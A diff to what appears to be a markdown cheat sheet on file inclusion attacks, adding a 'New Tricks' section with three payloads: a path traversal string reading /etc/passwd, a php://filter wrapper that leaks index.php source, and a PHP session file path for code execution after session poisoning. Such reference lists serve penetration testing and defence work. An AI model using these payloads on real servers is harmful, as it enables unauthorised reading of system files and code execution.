@@ -75,3 +75,17 @@
 |`@Html.RemotePartial()`|Yes|No|Yes|
 |`Response.WriteFile()`|Yes|No|No|
 |`include`|Yes|Yes|Yes|
+
+## New Tricks
+
+### Trick 1
+- Scenario: Download endpoint read passwd using traversal in filename parameter.
+- Payload: `../../../../etc/passwd`
+
+### Trick 2
+- Scenario: PHP filter wrapper leaked source code of index.php.
+- Payload: `php://filter/convert.base64-encode/resource=index.php`
+
+### Trick 3
+- Scenario: Session file include turned into code execution after poisoning.
+- Payload: `/var/lib/php/sessions/sess_<knownid>`
